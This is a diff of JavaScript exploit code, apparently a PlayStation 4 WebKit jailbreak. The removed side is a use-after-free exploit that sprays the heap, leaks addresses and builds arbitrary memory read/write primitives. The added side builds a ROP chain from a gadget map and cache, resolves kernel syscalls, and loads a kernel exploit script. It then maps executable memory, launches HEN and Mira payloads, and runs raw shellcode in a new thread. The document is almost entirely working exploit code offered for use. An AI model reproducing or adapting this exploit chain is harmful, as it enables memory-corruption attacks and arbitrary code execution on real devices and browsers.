@@ -1,428 +1,470 @@
-/////////////////// UTILITY STUFF ///////////////////
+var p;
 
-function makeid() {
-  var text = "";
-  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    
-  for( var i=0; i < 8; i++ )
-  text += possible.charAt(Math.floor(Math.random() * possible.length));
-    
-  return text;
+var print = function (x) {
+  document.getElementById("console").innerText += x + "\n";
+}
+var print = function (string) { // like print but html
+  document.getElementById("console").innerHTML += string + "\n";
+}
+
+var get_jmptgt = function (addr) {
+  var z = p.read4(addr) & 0xFFFF;
+  var y = p.read4(addr.add32(2));
+  if (z != 0x25ff) return 0;
+
+  return addr.add32(y + 6);
+}
+
+var gadgetmap_wk = {
+  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
+  "pop rsi": [0x5e, 0xc3],
+  "pop rdi": [0x5f, 0xc3],
+  "pop rsp": [0x5c, 0xc3],
+  "pop rax": [0x58, 0xc3],
+  "pop rdx": [0x5a, 0xc3],
+  "pop rcx": [0x59, 0xc3],
+  "pop rsp": [0x5c, 0xc3],
+  "pop rbp": [0x5d, 0xc3],
+  "pop r8": [0x47, 0x58, 0xc3],
+  "pop r9": [0x47, 0x59, 0xc3],
+  "infloop": [0xeb, 0xfe, 0xc3],
+  "ret": [0xc3],
+  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
+  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
+  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
+  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
 };
 
-var instancespr = [];
+var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
+slowpath_jop.reverse();
 
-for(var i=0; i<2048; i++) {
-  instancespr[i] = {};
-  instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
+var gadgets;
+window.stage2 = function () {
+  try {
+    window.stage2_();
+  } catch (e) {
+    print(e);
+  }
 }
-for(var i=2048; i<4096; i++) {
-  instancespr[i] = new Uint32Array(1);
-  instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
+var gadgetcache = {
+  "ret":                    0x0000003C,
+  "jmp rax":                0x00000082,
+  "ep":                     0x000000AD,   
+  "pop rbp":                0x000000B6,
+  "mov [rdi], rax":         782172,
+  "pop r8":                 0x000179C5,    
+  "pop rax":                17781,
+  "mov rax, rdi":           0x000058D0,
+  "mov rax, [rax]":         0x0006C83A,
+  "pop rsi":                597265,
+  "pop rdi":                239071,
+  "pop rcx":                0x00052E59,  
+  "pop rsp":                128173,
+  "mov [rdi], rsi":         150754,
+  "mov [rax], rsi":         0x00256667,
+  "pop rdx":                0x001BE024,     
+  "pop r9":                 0x00BB320F,
+  "jop":                    813600,  
+  "infloop":                0x01545EAA,
+
+  "add rax, rcx":           0x000156DB,
+  "add rax, rsi":           0x001520C6,
+  "and rax, rsi":           0x01570B9F,
+  "mov rdx, rax":           0x00353B31,
+  "mov rdi, rax":           0x015A412F,
+  "mov rax, rdx":           0x001CEF20,
+  "jmp rdi":                0x00295E7E,
+  
+    // Used for kernel exploit stuff
+  "mov rbp, rsp":           0x000F094A,
+  "mov rax, [rdi]":         0x00046EF9,
+  "add rdi, rax":           0x005557DF,
+  "add rax, rsi":           0x001520C6,
+  "and rax, rsi":           0x01570B9F,
+  "jmp rdi":                0x00295E7E,
 }
 
-var _dview;
-
-function u2d(low, hi) {
-  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-  _dview.setUint32(0, hi);
-  _dview.setUint32(4, low);
-  return _dview.getFloat64(0);
-}
-
-function int64(low,hi) {
-  this.low = (low>>>0);
-  this.hi = (hi>>>0);
-
-  this.add32inplace = function(val) {
-    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-    var new_hi = (this.hi >>> 0);
-
-    if (new_lo < this.low) {
-      new_hi++;
+window.stage2_ = function() {
+    p = window.prim;
+    
+    p.leakfunc = function(func)    {
+        var fptr_store = p.leakval(func);
+        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
+    }
+  
+    var parseFloatStore = p.leakfunc(parseFloat);
+    var parseFloatPtr = p.read8(parseFloatStore);
+    var webKitBase = p.read8(parseFloatStore);
+    window.webKitBase = webKitBase;
+    
+    webKitBase.low &= 0xfffff000;
+    webKitBase.sub32inplace(0x5b7000-0x1C000);
+    
+    var o2wk = function(o)    {
+        return webKitBase.add32(o);
     }
 
-    this.hi=new_hi;
-    this.low=new_lo;
+    gadgets = {
+        "stack_chk_fail": o2wk(0xc8),
+        "memset": o2wk(0x228),
+        "setjmp": o2wk(0x14f8)
+    };
+
+   var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
+   libSceLibcInternalBase.low &= ~0x3FFF;
+   libSceLibcInternalBase.sub32inplace(0x20000);
+    
+  var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
+  window.libKernelBase = libKernelBase;
+  libKernelBase.low &= 0xfffff000;
+  libKernelBase.sub32inplace(0xd000 + 0x4000);
+  
+   var o2lk = function (o) {
+    return libKernelBase.add32(o);
   }
 
-  this.add32 = function(val) {
-    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-    var new_hi = (this.hi >>> 0);
+  window.o2lk = o2lk;
 
-    if (new_lo < this.low) {
-      new_hi++;
+  var wkview = new Uint8Array(0x1000);
+  var wkstr = p.leakval(wkview).add32(0x10);
+  var orig_wkview_buf = p.read8(wkstr);
+
+  p.write8(wkstr, webKitBase);
+  p.write4(wkstr.add32(8), 0x367c000);
+
+  var gadgets_to_find = 0;
+  var gadgetnames = [];
+  for (var gadgetname in gadgetmap_wk) {
+    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
+      gadgets_to_find++;
+      gadgetnames.push(gadgetname);
+      gadgetmap_wk[gadgetname].reverse();
     }
-
-    return new int64(new_lo, new_hi);
-  }
-
-  this.sub32 = function(val) {
-    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-    var new_hi = (this.hi >>> 0);
-
-    if (new_lo > (this.low) & 0xFFFFFFFF) {
-      new_hi--;
-    }
-
-    return new int64(new_lo, new_hi);
-  }
-
-  this.sub32inplace = function(val) {
-    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-    var new_hi = (this.hi >>> 0);
-
-    if (new_lo > (this.low) & 0xFFFFFFFF) {
-      new_hi--;
-    }
-
-    this.hi=new_hi;
-    this.low=new_lo;
-  }
-
-  this.and32 = function(val) {
-    var new_lo = this.low & val;
-    var new_hi = this.hi;
-    return new int64(new_lo, new_hi);
-  }
-
-  this.and64 = function(vallo, valhi) {
-    var new_lo = this.low & vallo;
-    var new_hi = this.hi & valhi;
-    return new int64(new_lo, new_hi);
-  }
-
-  this.toString = function(val) {
-    val = 16;
-    var lo_str = (this.low >>> 0).toString(val);
-    var hi_str = (this.hi >>> 0).toString(val);
-
-    if(this.hi == 0)
-      return lo_str;
-    else
-      lo_str = zeroFill(lo_str, 8)
-
-    return hi_str+lo_str;
-  }
-
-  this.toPacked = function() {
-    return {hi: this.hi, low: this.low};
-  }
-
-  this.setPacked = function(pck) {
-    this.hi=pck.hi;
-    this.low=pck.low;
-    return this;
   }
     
-  return this;
-}
+    gadgets_to_find++;
 
-function zeroFill(number, width ) {
-    width -= number.toString().length;
+  var findgadget = function (donecb) {
+    if (gadgetcache) {
+      gadgets_to_find = 0;
+      slowpath_jop = 0;
 
-    if (width > 0) {
-        return new Array(width + (/\./.test( number ) ? 2 : 1)).join('0') + number;
+      for (var gadgetname in gadgetcache) {
+        if (gadgetcache.hasOwnProperty(gadgetname)) {
+          gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
+        }
+      }
+    } else {
+      for (var i = 0; i < wkview.length; i++) {
+        if (wkview[i] == 0xc3) {
+          for (var nl = 0; nl < gadgetnames.length; nl++) {
+            var found = 1;
+            if (!gadgetnames[nl]) continue;
+            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
+            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
+              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
+                found = 0;
+                break;
+              }
+            }
+            if (!found) continue;
+            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
+            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
+            delete gadgetnames[nl];
+            gadgets_to_find--;
+          }
+        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
+          var found = 1;
+          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
+            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
+              found = 0;
+              break;
+            }
+          }
+          if (!found) continue;
+          gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
+          gadgetoffs["jop"] = i - slowpath_jop.length + 1;
+          gadgets_to_find--;
+          slowpath_jop = 0;
+        }
+
+        if (!gadgets_to_find) break;
+      }
     }
+    if (!gadgets_to_find && !slowpath_jop) {
+      setTimeout(donecb, 50);
+    } else {
+      for (var nl in gadgetnames) {
 
-    return number + ""; // always return a string
-}
+      }
+      if (slowpath_jop) print(" - jop gadget");
+    }
+  }
+  
+  findgadget(function () { });
+  var hold1;
+  var hold2;
+  var holdz;
+  var holdz1;
 
-var nogc = [];
+  while (1) {
+    hold1 = { a: 0, b: 0, c: 0, d: 0 };
+    hold2 = { a: 0, b: 0, c: 0, d: 0 };
+    holdz1 = p.leakval(hold2);
+    holdz = p.leakval(hold1);
+    if (holdz.low - 0x30 == holdz1.low) break;
+  }
 
-/////////////////// STAGE 1: INFOLEAK ///////////////////
+  var pushframe = [];
+  pushframe.length = 0x80;
+  var funcbuf;
+  var funcbuf32 = new Uint32Array(0x100);
+  nogc.push(funcbuf32);
 
-failed = false
+  var launch_chain = function (chain) {
+    var stackPointer = 0;
+    var stackCookie = 0;
+    var orig_reenter_rip = 0;
+    
+        var reenter_help = {length: {valueOf: function(){
+            orig_reenter_rip = p.read8(stackPointer);
+            stackCookie = p.read8(stackPointer.add32(8));
+            var returnToFrame = stackPointer;
+            
+            var ocnt = chain.count;
+            chain.push_write8(stackPointer, orig_reenter_rip);
+            chain.push_write8(stackPointer.add32(8), stackCookie);
+            
+            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
+            
+            chain.push(gadgets["pop rsp"]); // pop rsp
+            chain.push(returnToFrame); // -> back to the trap life
+            chain.count = ocnt;
+            
+            p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
+            p.write8(stackPointer.add32(8), chain.stackBase); // -> rop frame
+        }
+      }
+    };        
+        
+    funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
 
-// Spray a bunch of JSObjects on the heap for stability
-for(var i = 0; i < 0x4000; i++) {
-  nogc.push({a: 0, b: 0, c: 0, d: 0});
-}
+    p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
+    p.write8(funcbuf.add32(0x80), gadgets["jop"]);
+    p.write8(funcbuf, funcbuf);
+    p.write8(parseFloatStore, gadgets["jop"]);
+    var orig_hold = p.read8(holdz1);
+    var orig_hold48 = p.read8(holdz1.add32(0x48));
 
-// Target JSObject for overlap
-var tgt = {a: 0, b: 0, c: 0, d: 0}
+    p.write8(holdz1, funcbuf.add32(0x50));
+    p.write8(holdz1.add32(0x48), funcbuf);
+    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
+    p.write8(holdz1, orig_hold);
+    p.write8(holdz1.add32(0x48), orig_hold48);
 
-for(var i = 0; i < 0x400; i++) {
-  nogc.push({a: 0, b: 0, c: 0, d: 0});
-}
+    stackPointer = p.read8(funcbuf.add32(0x10));
+    rtv = Array.prototype.splice.apply(reenter_help);
+    return p.leakval(rtv);
+  }
+     
+    gadgets = gadgets;
+    p.loadchain = launch_chain;
+    
+    function swapkeyval(json){
+        var ret = {};
+        for(var key in json){
+            if (json.hasOwnProperty(key)) {
+                ret[json[key]] = key;
+            }
+        }
+        return ret;
+    }
+    
+      var kview = new Uint8Array(0x1000);
+  var kstr = p.leakval(kview).add32(0x10);
+  var orig_kview_buf = p.read8(kstr);
 
-var y = new ImageData(1, 0x4000)
-postMessage("", "*", [y.data.buffer]);
+  p.write8(kstr, window.libKernelBase);
+  p.write4(kstr.add32(8), 0x40000);
 
-// Spray properties to ensure object is fastmalloc()'d and can be found easily later
-var props = {};
-
-for(var i = 0; (i < (0x4000 / 2));) {
-  props[i++] = {value: 0x42424242};
-  props[i++] = {value: tgt};
-}
-
-// Find address of JSValue by leaking one of the JSObject's we sprayed
-var foundLeak   = undefined;
-var foundIndex  = 0;
-var maxCount    = 0x100;
-
-// Only check 256 times, should rarely fail
-while(foundLeak == undefined && maxCount > 0) {
-  maxCount--;
-
-  history.pushState(y, "");
-
-  Object.defineProperties({}, props);
-
-  var leak = new Uint32Array(history.state.data.buffer);
-
-  // Check memory against known values such as 0x42424242 JSValue and empty JSObject values
-  for(var i = 0; i < leak.length - 6; i++) {
-    if(
-      leak[i]       == 0x42424242 &&
-      leak[i + 0x1] == 0xFFFF0000 &&
-      leak[i + 0x2] == 0x00000000 &&
-      leak[i + 0x3] == 0x00000000 &&
-      leak[i + 0x4] == 0x00000000 &&
-      leak[i + 0x5] == 0x00000000 &&
-      leak[i + 0x6] == 0x0000000E &&
-      leak[i + 0x7] == 0x00000000 &&
-      leak[i + 0xA] == 0x00000000 &&
-      leak[i + 0xB] == 0x00000000 &&
-      leak[i + 0xC] == 0x00000000 &&
-      leak[i + 0xD] == 0x00000000 &&
-      leak[i + 0xE] == 0x0000000E &&
-      leak[i + 0xF] == 0x00000000
-    ) {
-      foundIndex = i;
-      foundLeak = leak;
+  var countbytes;
+  for (var i = 0; i < 0x40000; i++) {
+    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
+      countbytes = i;
       break;
     }
   }
-}
 
-// Oh no :(
-if(!foundLeak) {
-  failed = true
-  fail("Failed to find leak!")
-}
-
-// Get first JSValue
-var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
-var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
-leakJSVal.toString();
-
-// Spray and clear 
-for(var i = 0; i < 0x4000; i++) {
-  var lol = {a: 0, b: 0, c: 0, d: 0};
-}
-
-// Force garbage collection via memory pressure
-var dgc = function() {
-  for (var i = 0; i < 0x100; i++) {
-    new ArrayBuffer(0x100000);
-  }
-}
-
-/////////////////// STAGE 2: UAF ///////////////////
-
-// Userland pwnage
-function exploit() {
-  if(failed) {
-    return;
-  }
-
-  try {
-    var src = document.createAttribute('src');
-    src.value = 'javascript:parent.callback()';
-      
-    var d = document.createElement('div');
-
-    // Sandwich our target iframe
-    for(var i = 0; i < 0x4000; i++) {
-      nogc.push(document.createElement('iframe'));
-    }
-
-    var f = document.body.appendChild(document.createElement('iframe'));
-
-    for(var i = 0; i < 0x4000; i++) {
-      nogc.push(document.createElement('iframe'));
-    }
-
-    // Free the iframe!
-    window.callback = () => {
-      window.callback = null;
-      
-      d.setAttributeNodeNS(src);
-      f.setAttributeNodeNS(document.createAttribute('src'));
-    };
-
-    f.name = "lol";
-    f.setAttributeNodeNS(src);
-    f.remove();
+    p.write4(kstr.add32(8), countbytes + 32);
     
-    f = null;
-    src = null;
-    nogc.length=0;
-    dgc();
-
-    /////////////////// STAGE 3: HEAP SPRAY ///////////////////
-
-    // Setup spray variables
-    var objSpray  = 0x10000;
-    var objSz     = 0x90;
-    var objs      = new Array(objSpray);
-
-    // Spray the heap with MarkedArgumentBuffers to corrupt iframe JSObject's backing memory. ImageData does this well.
-    for(var i = 0; i < objSpray; i++) {
-      objs[i] = new ImageData(1, objSz / 4);
-    }
-
-    for(var i = 0; i < objSpray; i++) {
-      objs[i] = new Uint32Array(objs[i].data.buffer);
-    }
-
-    /////////////////// STAGE 4: MISALIGNING JSVALUES ///////////////////
-
-    var craftptr = leakJSVal.sub32(0x10000 - 0x10)
-    tgt.b = u2d(0,craftptr.low); // 0x10000 is offset due to double encoding
-    tgt.c = craftptr.hi;
-    tgt.a = u2d(2048, 0x1602300);
-
-    /////////////////// STAGE 3 - CONTINUED ///////////////////
-
-    // Memory corruption ; not even once!
-    for (var i=0; i<objSpray; i++)
+    var dview32 = new Uint32Array(1);
+    var dview8 = new Uint8Array(dview32.buffer);
+    for (var i=0; i < countbytes; i++)
     {
-      // The poor butterflies :(
-      objs[i][2] = leakJSVal.low + 0x18 + 4;
-      objs[i][3] = leakJSVal.hi;
-    }
-
-    /////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////
-
-    // Retrieve stale reference and setup primitive helpers
-    var stale   = d.attributes[0].ownerElement;
-    var master  = new Uint32Array(0x1000);
-    var slave   = new Uint32Array(0x1000);
-    var leakval_u32     = new Uint32Array(0x1000);
-    var leakval_helper  = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
-
-    // Create fake ArrayBufferView
-    tgt.a = u2d(4096, 0x1602300);
-    tgt.b = 0;
-    tgt.c = leakval_helper;
-    tgt.d = 0x1337;
-
-    // Save old butterfly
-    var butterfly = new int64(stale[2], stale[3]);
-
-    // Set leakval_u32's vector to leakval_helper's butterfly
-    tgt.c = leakval_u32;
-    var lkv_u32_old = new int64(stale[4], stale[5]);
-    
-    stale[4] = butterfly.low;
-    stale[5] = butterfly.hi;
-
-    // Setup read/write primitive
-    tgt.c = master;
-    stale[4] = leakval_u32[0];
-    stale[5] = leakval_u32[1];
-    
-    var addr_to_slavebuf = new int64(master[4], master[5]);
-    tgt.c = leakval_u32;
-    stale[4] = lkv_u32_old.low;
-    stale[5] = lkv_u32_old.hi;
-
-    // Restore proper JSValues
-    for (var i=0; i<objSpray; i++)
-    {
-      objs[i][2] = 0x41414141;
-      objs[i][3] = 0xFFFF0000;
-    }
-
-    // Don't need these anymore
-    tgt.c = 0;
-    stale = 0;
-
-    // Primitives :D
-    var prim = {
-      write8: function(addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        if (val instanceof int64) {
-          slave[0] = val.low;
-          slave[1] = val.hi;
-        } else {
-          slave[0] = val;
-          slave[1] = 0;
+        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
+        {
+            dview8[0] = kview[i+3];
+            dview8[1] = kview[i+4];
+            dview8[2] = kview[i+5];
+            dview8[3] = kview[i+6];
+            var syscallno = dview32[0];
+            window.syscalls[syscallno] = window.libKernelBase.add32(i);
         }
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-      },
-
-      write4: function(addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        slave[0] = val;
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-      },
-
-      read8: function(addr) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = new int64(slave[0], slave[1]);
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
-      },
-
-      read4: function(addr)
-      {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = slave[0];
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
-      },
-
-      leakval: function(jsval)
-      {
-        leakval_helper[0] = jsval;
-        var rtv = this.read8(butterfly);
-        this.write8(butterfly, new int64(0x41414141, 0xffffffff));
-          
-        return rtv;
-      },
-
-      createval: function(jsval)
-      {
-        this.write8(butterfly, jsval);
-        var rt = leakval_helper[0];
-        this.write8(butterfly, new int64(0x41414141, 0xffffffff));
-        return rt;
-      }
+    }
+    var chain = new window.Rop;
+    var returnvalue;
+    p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+        chain.clear();
+        
+        chain.notimes = this.next_notime;
+        this.next_notime = 1;
+        
+        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+        
+        chain.push(window.gadgets["pop rdi"]); // pop rdi
+        chain.push(chain.stackBase.add32(0x3ff8)); // where
+        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
+        
+        chain.push(window.gadgets["pop rax"]); // pop rax
+        chain.push(p.leakval(0x41414242)); // where
+        
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+        returnvalue = p.read8(chain.stackBase.add32(0x3ff8)); //p.read8(chain.stackBase.add32(0x3ff8));
+    }
+    p.fcall = function()
+    {
+        var rv=p.fcall_.apply(this,arguments);
+        return returnvalue;
+    }
+    p.readstr = function(addr){
+        var addr_ = addr.add32(0); // copy
+        var rd = p.read4(addr_);
+        var buf = "";
+        while (rd & 0xFF)
+        {
+            buf += String.fromCharCode(rd & 0xFF);
+            addr_.add32inplace(1);
+            rd = p.read4(addr_);
+        }
+        return buf;
+    }
+    
+    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
+    {
+        if (typeof sysc == "string") {
+            sysc = window.syscallnames[sysc];
+        }
+        if (typeof sysc != "number") {
+            throw new Error("invalid syscall");
+        }
+        
+        var off = window.syscalls[sysc];
+        if (off == undefined)
+        {
+            throw new Error("invalid syscall");
+        }
+        
+        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
+    }
+    p.stringify = function(str) {
+        var bufView = new Uint8Array(str.length+1);
+        for (var i=0; i<str.length; i++) {
+            bufView[i] = str.charCodeAt(i) & 0xFF;
+        }
+        window.nogc.push(bufView);
+        return p.read8(p.leakval(bufView).add32(0x10));
     };
-
-    window.primitives = prim;
-
-    postExploit();
-  } catch(e) {
-    failed = true
-    fail("Exception: " + e)
+   
+    p.malloc = function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    window.nogc.push(backing);
+    var ptr = p.read8(p.leakval(backing).add32(0x10));
+    ptr.backing = backing;
+    return ptr;
   }
 
-  /*setTimeout(function() {
+    p.malloc32 = function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    window.nogc.push(backing);
+    var ptr = p.read8(p.leakval(backing).add32(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+  }
+
+      // Test if the kernel is already patched
+  var test = p.syscall("setuid", 0);
+
+  if (test != '0') {
+    // Kernel not patched, run kernel exploit
     sc = document.createElement("script");
-    sc.src="kernel.js";
+    sc.src="kern.js";
     document.body.appendChild(sc);
-  }, 100);*/
+
+  } else {
+    // Kernel patched, launch cool stuff
+
+    // Check mira status
+    var testMira = p.syscall("setlogin", p.stringify("root"))
+    if(testMira != '0') {
+      var code_addr = new int64(0x26100000, 0x00000009);
+      var buffer = p.syscall("mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
+
+      // Load HEN-VTX
+      if (buffer == '926100000') {
+        writeHomebrewEN(p, code_addr.add32(0x100000));
+      }
+
+      // Launch HEN-VTX
+      p.fcall(code_addr);
+
+      // Zero
+      for(var i = 0; i < 0x300000; i += 8)
+      {
+        p.write8(code_addr.add32(i), 0);
+      }
+
+      // Load Mira
+      if (buffer == '926100000') {
+        writeMira(p, code_addr.add32(0x100000));
+      }
+
+      // Launch Mira
+      p.fcall(code_addr);
+
+      // Test if payloads ran successfully, if not, refresh
+      testMira = p.syscall("setlogin", p.stringify("root"))
+
+      if(testMira != '0')
+      {
+        location.reload();
+      }
+
+      // All done all done!
+      allset();
+    } else {
+      // Load payload launcher
+      var code_addr = new int64(0x26100000, 0x00000009);
+      var buffer = p.syscall("mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
+
+      if (buffer == '926100000') {
+        try {
+          var createThread = window.webKitBase.add32(0x779390);
+          var shellbuf = p.malloc32(0x1000);
+
+          var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
+
+          for (var i = 0; i < shcode.length; i++) {
+            shellbuf.backing[i] = shcode[i];
+          }
+
+          p.syscall("mprotect", shellbuf, 0x4000, 7);
+        } catch (e) { alert(e); }
+      }
+
+      // Launch loader
+      p.fcall(createThread, shellbuf, 0, p.stringify("loader"));
+      awaitpl();
+    }
+  } 
 }
+
